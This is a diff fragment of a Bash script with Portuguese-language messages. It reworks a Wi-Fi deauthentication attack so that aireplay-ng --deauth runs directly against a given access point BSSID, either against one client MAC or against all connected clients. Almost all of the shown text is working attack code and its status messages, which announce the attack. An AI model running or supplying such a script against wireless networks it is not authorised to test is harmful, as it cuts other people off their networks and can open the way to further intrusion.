@@ -32,19 +32,15 @@ if [[ -z "$BSSID" || -z "$INTERFACE" ]]; then
 fi
 
 # Construir comando
-CMD="aireplay-ng --deauth $DEAUTH_COUNT -a $BSSID"
-
 if [[ -n "$CLIENT_MAC" ]]; then
-    CMD="$CMD -c $CLIENT_MAC"
     echo -e "${BLUE}[*] Atacando cliente específico: $CLIENT_MAC${NC}"
+    echo -e "${GREEN}[+] Executando deauth...${NC}"
+    echo -e "${CYAN}Comando: aireplay-ng --deauth $DEAUTH_COUNT -a $BSSID -c $CLIENT_MAC $INTERFACE${NC}\n"
+    aireplay-ng --deauth $DEAUTH_COUNT -a "$BSSID" -c "$CLIENT_MAC" "$INTERFACE"
 else
     echo -e "${YELLOW}[*] Atacando todos os clientes do AP${NC}"
+    echo -e "${GREEN}[+] Executando deauth...${NC}"
+    echo -e "${CYAN}Comando: aireplay-ng --deauth $DEAUTH_COUNT -a $BSSID $INTERFACE${NC}\n"
+    aireplay-ng --deauth $DEAUTH_COUNT -a "$BSSID" "$INTERFACE"
 fi
-
-CMD="$CMD $INTERFACE"
-
-echo -e "${GREEN}[+] Executando deauth...${NC}"
-echo -e "${CYAN}Comando: $CMD${NC}\n"
-
-$CMD
 
